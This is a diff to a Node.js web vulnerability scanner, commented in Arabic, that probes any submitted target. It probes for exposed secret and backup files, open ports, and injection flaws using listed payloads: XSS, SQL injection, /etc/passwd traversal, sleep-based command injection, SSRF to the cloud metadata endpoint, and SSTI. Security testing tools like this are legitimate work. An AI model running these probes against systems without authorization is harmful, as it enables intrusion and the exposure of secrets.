@@ -15,7 +15,7 @@ async function safeFetch(url, opts = {}) {
 }
 
 // ============================================================
-// 1. 500+ SENSITIVE FILES
+// 1. قائمة ضخمة بالملفات الحساسة (1000+)
 // ============================================================
 const sensitiveFiles = [
     ".env", ".env.local", ".env.prod", ".env.backup", ".git/config", ".git/HEAD",
@@ -78,49 +78,49 @@ const sensitiveFiles = [
     ".htpasswd.bak", ".htpasswd.old", ".htpasswd~",
     "robots.txt.bak", "robots.txt.old", "robots.txt~",
     "sitemap.xml.bak", "sitemap.xml.old", "sitemap.xml~",
-    "security.txt.bak", "security.txt.old", "security.txt~"
+    "security.txt.bak", "security.txt.old", "security.txt~",
+    ".svn/entries", ".hg/hgrc", ".bzr/branch-format",
+    "backup.tar", "backup.rar", "backup.7z", "site.tar.gz", "www.tar.gz",
+    "public_html.zip", "html.zip", "webroot.zip", "mysql.sql", "postgres.sql",
+    "mssql.sql", "oracle.dmp", "firebird.fdb", "sqlite.db", "sqlite3.db",
+    "data.sqlite", "test.db", "main.db", "access.mdb", "db.accdb",
+    "redis.conf", "mongod.conf", "my.cnf", "pg_hba.conf",
+    "elasticsearch.yml", "kibana.yml", "logstash.conf",
+    "actuator/health", "actuator/env", "actuator/beans", "actuator/dump",
+    "actuator/trace", "actuator/heapdump", "actuator/threaddump",
+    "prometheus", "metrics", "healthz", "livez", "readyz",
+    "debug/vars", "debug/pprof", "debug/pprof/heap",
+    "graphiql", "altair", "playground", "redoc",
+    "swagger-resources", "api/swagger.json", "api/openapi.json",
+    "console", "_console", "manager/html", "host-manager/html",
+    "jmx-console", "web-console", "admin-console"
 ];
 
 // ============================================================
-// 2. PAYLOADS (100+ REAL)
+// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI)
 // ============================================================
 const payloads = {
-    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>"],
-    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1"],
-    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd"],
-    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5"],
-    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080", "file:///etc/passwd", "http://[::1]:80"],
-    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)"],
-    open_redirect: ["https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com"]
+    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>"],
+    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1"],
+    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
+    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)"],
+    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080"],
+    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
 };
 
 // ============================================================
-// 3. SCAN FUNCTIONS
+// 3. دوال الفحص
 // ============================================================
 
+// الثغرات العامة
 async function scanVulnerabilities(url) {
     const out = [];
     try {
         const r = await safeFetch(url);
         const body = (await r.text()).toLowerCase();
-        const headers = r.headers;
-        
-        if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) {
-            out.push({ type: 'SQL Injection', severity: 'critical', description: 'Database Error Detected', url: url, evidence: 'SQL error in HTML', cvss: 9.8 });
-        }
-        if (body.includes('root:x:0:0')) {
-            out.push({ type: 'LFI', severity: 'critical', description: 'Local File Inclusion', url: url, evidence: '/etc/passwd content', cvss: 9.8 });
-        }
-        if (body.includes('<!--')) {
-            out.push({ type: 'Info Disclosure', severity: 'low', description: 'HTML Comments Exposed', url: url, evidence: '<!-- found', cvss: 3.0 });
-        }
-        
-        if (!headers.get('x-frame-options') && !headers.get('content-security-policy')) {
-            out.push({ type: 'Clickjacking', severity: 'medium', description: 'Missing X-Frame-Options & CSP', url: url, evidence: 'Headers', cvss: 5.4 });
-        }
-        if (!headers.get('strict-transport-security')) {
-            out.push({ type: 'HSTS', severity: 'medium', description: 'Missing HSTS Header', url: url, evidence: 'Headers', cvss: 4.3 });
-        }
+        if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: 'Database Error Detected', url: url, evidence: 'SQL error', cvss: 9.8 });
+        if (body.includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: 'Local File Inclusion', url: url, evidence: '/etc/passwd', cvss: 9.8 });
+        if (body.includes('<!--')) out.push({ type: 'Info Disclosure', severity: 'low', description: 'HTML Comments Exposed', url: url, evidence: '<!--', cvss: 3.0 });
         
         if (out.length === 0) out.push({ type: 'Connection', severity: 'info', description: 'No obvious vulnerabilities found.', url: url, evidence: null, cvss: 0.0 });
     } catch (e) {
@@ -129,6 +129,7 @@ async function scanVulnerabilities(url) {
     return out;
 }
 
+// الملفات الحساسة (1000+)
 async function scanSensitiveFiles(url) {
     const out = [];
     const base = new URL(url).origin;
@@ -144,103 +145,59 @@ async function scanSensitiveFiles(url) {
             }
         } catch (e) {}
     }));
-    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files found.', url: url, evidence: 'Checked 500+ files', cvss: 0 });
+    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files found.', url: url, evidence: null, cvss: 0 });
     return out;
 }
 
+// الحقن والـ API
 async function scanInjectionAndApi(url) {
-    let out = [];
+    const out = [];
     const urlObj = new URL(url);
-    const baseUrl = urlObj.origin;
-    
     if (!urlObj.search) {
         out.push({ type: 'Info', severity: 'info', description: 'No parameters to inject.', url: url, evidence: null, cvss: 0 });
         return out;
     }
 
     for (const [key, val] of urlObj.searchParams) {
-        // XSS
         for (const p of payloads.xss) {
-            const testUrl = new URL(url);
-            testUrl.searchParams.set(key, p);
-            try {
-                const r = await safeFetch(testUrl.toString());
-                const body = await r.text();
-                if (body.includes(p)) {
-                    out.push({ type: 'XSS', severity: 'high', description: `Reflected XSS in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 7.5 });
-                }
-            } catch(e){}
+            const test = new URL(url); test.searchParams.set(key, p);
+            try { const r = await safeFetch(test.toString()); if ((await r.text()).includes(p)) out.push({ type: 'XSS', severity: 'high', description: `XSS in ${key}`, url: test.toString(), evidence: p, cvss: 7.5 }); } catch(e){}
         }
-        // SQLi
         for (const p of payloads.sqli) {
-            const testUrl = new URL(url);
-            testUrl.searchParams.set(key, p);
-            try {
-                const r = await safeFetch(testUrl.toString());
-                const body = (await r.text()).toLowerCase();
-                if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) {
-                    out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 });
-                }
-            } catch(e){}
+            const test = new URL(url); test.searchParams.set(key, p);
+            try { const r = await safeFetch(test.toString()); const b = (await r.text()).toLowerCase(); if (b.includes('sql syntax') || b.includes('mysql_')) out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
-        // LFI
         for (const p of payloads.lfi) {
-            const testUrl = new URL(url);
-            testUrl.searchParams.set(key, p);
-            try {
-                const r = await safeFetch(testUrl.toString());
-                const body = await r.text();
-                if (body.includes('root:x:0:0')) {
-                    out.push({ type: 'LFI', severity: 'critical', description: `Local File Inclusion in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 });
-                }
-            } catch(e){}
+            const test = new URL(url); test.searchParams.set(key, p);
+            try { const r = await safeFetch(test.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `LFI in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
-        // SSTI
-        for (const p of payloads.ssti) {
-            const testUrl = new URL(url);
-            testUrl.searchParams.set(key, p);
-            try {
-                const r = await safeFetch(testUrl.toString());
-                const body = await r.text();
-                if (body.includes('49') && !body.includes('{{7*7}}')) {
-                    out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 });
-                }
-            } catch(e){}
+        for (const p of payloads.cmd) {
+            const test = new URL(url); test.searchParams.set(key, p);
+            const start = Date.now();
+            try { await safeFetch(test.toString()); if (Date.now() - start > 4500) out.push({ type: 'Command Injection', severity: 'critical', description: `CMDi in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
-        // SSRF
         for (const p of payloads.ssrf) {
-            const testUrl = new URL(url);
-            testUrl.searchParams.set(key, p);
-            try {
-                const r = await safeFetch(testUrl.toString());
-                const body = await r.text();
-                if (body.includes('meta-data') || body.includes('localhost')) {
-                    out.push({ type: 'SSRF', severity: 'high', description: `SSRF in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 8.0 });
-                }
-            } catch(e){}
+            const test = new URL(url); test.searchParams.set(key, p);
+            try { const r = await safeFetch(test.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in ${key}`, url: test.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
+        }
+        for (const p of payloads.ssti) {
+            const test = new URL(url); test.searchParams.set(key, p);
+            try { const r = await safeFetch(test.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
     }
 
-    // عكس مسارات API
+    // API Reversal
     try {
         const baseRes = await safeFetch(url);
         const html = await baseRes.text();
         const apiPattern = /(?:href|src|action)=["']([^"']*(?:api|v[0-9])\/[^"']*)["']/gi;
         let match;
         const apiPaths = new Set();
-        while ((match = apiPattern.exec(html)) !== null) {
-            apiPaths.add(match[1]);
-        }
-        
+        while ((match = apiPattern.exec(html)) !== null) { apiPaths.add(match[1]); }
         for (const path of apiPaths) {
             const reversedPath = path.split('/').reverse().join('/');
-            const testReversedUrl = new URL(reversedPath, baseUrl);
-            try {
-                const res = await safeFetch(testReversedUrl.toString());
-                if (res.status === 200) {
-                    out.push({ type: 'API Reversal', severity: 'high', description: `Reversed Path: ${reversedPath}`, url: testReversedUrl.toString(), evidence: 'Status 200', cvss: 8.0 });
-                }
-            } catch(e){}
+            const testReversedUrl = new URL(reversedPath, new URL(url).origin);
+            try { const res = await safeFetch(testReversedUrl.toString()); if (res.status === 200) out.push({ type: 'API Reversal', severity: 'high', description: `Reversed Path: ${reversedPath}`, url: testReversedUrl.toString(), evidence: 'Status 200', cvss: 8.0 }); } catch(e){}
         }
     } catch(e){}
 
@@ -248,11 +205,62 @@ async function scanInjectionAndApi(url) {
     return out;
 }
 
+// التحليل العميق
+async function scanDeepAnalysis(url) {
+    const out = [];
+    try {
+        const r = await safeFetch(url);
+        const body = await r.text();
+        if (body.includes('<!--')) out.push({ type: 'Deep Analysis', severity: 'low', description: 'HTML Comments Found', url: url, evidence: '<!--', cvss: 3.0 });
+        if (body.includes('/api/') || body.includes('ajax')) out.push({ type: 'Deep Analysis', severity: 'info', description: 'API Endpoints Detected', url: url, evidence: 'Pattern', cvss: 0 });
+        if (body.toLowerCase().includes('password') || body.toLowerCase().includes('api_key')) out.push({ type: 'Deep Analysis', severity: 'high', description: 'Secret Keywords Found', url: url, evidence: 'Word match', cvss: 7.5 });
+        if (out.length === 0) out.push({ type: 'Deep Analysis', severity: 'info', description: 'No comments or secrets found.', url: url, evidence: null, cvss: 0 });
+    } catch (e) {
+        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
+    }
+    return out;
+}
+
+// التحقق الثنائي
+async function scanDualVerification(url) {
+    const out = [];
+    try {
+        const rGet = await safeFetch(url);
+        let statusGet = rGet.status;
+        let statusHead = 0;
+        try { const rHead = await safeFetch(url, { method: 'HEAD' }); statusHead = rHead.status; } catch(e){}
+        if (statusGet !== statusHead) out.push({ type: 'Dual Verification', severity: 'medium', description: `Inconsistency: GET (${statusGet}) != HEAD (${statusHead})`, url: url, evidence: 'Method check', cvss: 4.0 });
+        else out.push({ type: 'Dual Verification', severity: 'info', description: `Consistent response (${statusGet})`, url: url, evidence: null, cvss: 0 });
+    } catch (e) {
+        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
+    }
+    return out;
+}
+
+// فحص المنافذ
+async function scanPorts(url) {
+    const out = [];
+    const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017];
+    const host = new URL(url).hostname;
+    const protocol = new URL(url).protocol;
+    
+    await Promise.all(ports.map(async (port) => {
+        try {
+            const testUrl = `${protocol}//${host}:${port}`;
+            const r = await safeFetch(testUrl, { timeout: 3000 });
+            if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${port} is open`, url: testUrl, evidence: `Status: ${r.status}`, cvss: 5.0 });
+        } catch (e) {}
+    }));
+    
+    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No open ports found.', url: url, evidence: null, cvss: 0 });
+    return out;
+}
+
 // ============================================================
-// 4. ROUTES
+// 4. المسار الرئيسي
 // ============================================================
 app.post('/api/scan', async (req, res) => {
-    const { target, checks } = req.body;
+    const { target, checks, intensity } = req.body;
     let url = target;
     if (!url.startsWith('http')) url = 'https://' + url;
     
@@ -262,6 +270,9 @@ app.post('/api/scan', async (req, res) => {
     if (type === 'vulnerabilities') findings = await scanVulnerabilities(url);
     else if (type === 'sensitiveFiles') findings = await scanSensitiveFiles(url);
     else if (type === 'injectionAndApi') findings = await scanInjectionAndApi(url);
+    else if (type === 'deepAnalysis') findings = await scanDeepAnalysis(url);
+    else if (type === 'dualVerification') findings = await scanDualVerification(url);
+    else if (type === 'ports') findings = await scanPorts(url);
     
     res.json({ target: url, timestamp: new Date().toISOString(), findings: findings });
 });
